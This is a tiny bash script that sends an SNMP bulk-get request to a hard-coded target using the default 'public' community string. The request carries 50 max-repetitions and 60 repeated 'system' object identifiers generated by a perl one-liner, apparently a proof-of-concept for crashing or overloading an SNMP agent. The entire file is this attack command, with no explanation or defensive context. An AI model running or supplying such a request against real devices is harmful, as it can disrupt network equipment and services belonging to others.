#!/usr/bin/env bash
target='198.18.0.1'
snmpbulkget -c public -Cn0 -Cr50 $target `perl -e "print 'system 'x60;"`

